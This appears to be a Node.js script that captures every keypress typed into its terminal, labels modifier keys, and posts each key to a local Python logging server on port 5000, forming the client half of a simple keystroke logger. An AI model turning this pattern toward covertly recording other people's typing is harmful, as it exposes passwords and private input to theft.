const readline = require('readline');
const http = require('http');

// Create a readline interface to capture input from the terminal
readline.emitKeypressEvents(process.stdin);
process.stdin.setRawMode(true);

// Function to send data to the Python server
const sendToServer = (key) => {
    const data = JSON.stringify({ key: key });

    const options = {
        hostname: 'localhost',
        port: 5000,
        path: '/log',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length,
        },
    };

    const req = http.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (error) => {
        console.error('Error:', error);
    });

    req.write(data);
    req.end();
};

// Listen for key presses
process.stdin.on('keypress', (str, key) => {
    let keyName = '';

    if (key.shift) {
        keyName += '[SHIFT] + ';
    }
    if (key.ctrl) {
        keyName += '[CTRL] + ';
    }
    if (key.alt) {
        keyName += '[ALT] + ';
    }
    if (key.meta) {
        keyName += '[META] + ';  // Meta is usually the Windows or Command key
    }

    switch (key.name) {
        case 'space':
            keyName += '[SPACE]';
            break;
        case 'return':
            keyName += '[ENTER]';
            break;
        case 'backspace':
            keyName += '[BACKSPACE]';
            break;
        case 'tab':
            keyName += '[TAB]';
            break;
        case 'escape':
            keyName += '[ESC]';
            break;
        case 'c':
            if (key.ctrl) {
                keyName = '[CTRL+C]';
                console.log('Exiting...');
                process.exit();
            }
            // No break needed; will fall through to default case if not Ctrl+C
        default:
            if (!key.ctrl && !key.alt && !key.shift && !key.meta) {
                keyName = key.sequence;  // Regular characters without modifiers
            } else if (key.name) {
                keyName += key.name.toUpperCase();  // Log key name in upper case if any modifier is present
            }
            break;
    }

    //console.log(`Captured key: ${keyName}`);

    // Send the keypress to the server
    sendToServer(keyName);
});
